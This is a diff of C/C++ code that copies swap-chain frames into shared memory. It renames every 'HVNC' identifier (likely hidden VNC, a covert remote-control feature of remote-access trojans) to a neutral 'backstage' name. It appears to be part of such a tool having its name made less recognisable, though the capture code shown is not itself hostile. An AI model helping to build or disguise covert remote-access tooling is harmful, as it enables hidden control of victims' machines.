@@ -111,12 +111,12 @@ static UINT64 GetTimestampNs(void) {
 
 static void BuildShmName(char* out, size_t outLen) {
     DWORD pid = GetCurrentProcessId();
-    snprintf(out, outLen, "%s%lu", HVNC_SHM_PREFIX, (unsigned long)pid);
+    snprintf(out, outLen, "%s%lu", backstage_SHM_PREFIX, (unsigned long)pid);
 }
 
 static void BuildEventName(char* out, size_t outLen) {
     DWORD pid = GetCurrentProcessId();
-    snprintf(out, outLen, "%s%lu", HVNC_EVENT_PREFIX, (unsigned long)pid);
+    snprintf(out, outLen, "%s%lu", backstage_EVENT_PREFIX, (unsigned long)pid);
 }
 
 //-----------------------------------------------------------------------------------------------//
@@ -124,7 +124,7 @@ static void BuildEventName(char* out, size_t outLen) {
 //-----------------------------------------------------------------------------------------------//
 static BOOL EnsureSharedMemory(UINT width, UINT height) {
     UINT stride = width * 4;
-    SIZE_T needed = sizeof(HVNCFrameHeader) + (SIZE_T)stride * height;
+    SIZE_T needed = sizeof(backstageFrameHeader) + (SIZE_T)stride * height;
 
     if (g_ShmView && g_ShmSize >= needed) {
         return TRUE;
@@ -281,7 +281,7 @@ static void CaptureFrameInner(IDXGISwapChain* pSwapChain) {
     UINT w = bbDesc.Width;
     UINT h = bbDesc.Height;
 
-    if (w == 0 || h == 0 || w > HVNC_MAX_WIDTH || h > HVNC_MAX_HEIGHT) {
+    if (w == 0 || h == 0 || w > backstage_MAX_WIDTH || h > backstage_MAX_HEIGHT) {
         backbuffer->Release();
         return;
     }
@@ -378,7 +378,7 @@ static void CaptureFrameInner(IDXGISwapChain* pSwapChain) {
 
     UINT dstStride = w * 4;
     UINT srcPitch = mapped.RowPitch;
-    BYTE* dst = (BYTE*)g_ShmView + sizeof(HVNCFrameHeader);
+    BYTE* dst = (BYTE*)g_ShmView + sizeof(backstageFrameHeader);
     BYTE* src = (BYTE*)mapped.pData;
 
     for (UINT y = 0; y < h; y++) {
@@ -389,9 +389,9 @@ static void CaptureFrameInner(IDXGISwapChain* pSwapChain) {
 
     // Write header (AFTER pixel data + barrier so reader sees consistent data)
     g_FrameSeq++;
-    HVNCFrameHeader* hdr = (HVNCFrameHeader*)g_ShmView;
-    hdr->magic      = HVNC_FRAME_MAGIC;
-    hdr->version    = HVNC_FRAME_VERSION;
+    backstageFrameHeader* hdr = (backstageFrameHeader*)g_ShmView;
+    hdr->magic      = backstage_FRAME_MAGIC;
+    hdr->version    = backstage_FRAME_VERSION;
     hdr->width      = w;
     hdr->height     = h;
     hdr->stride     = dstStride;
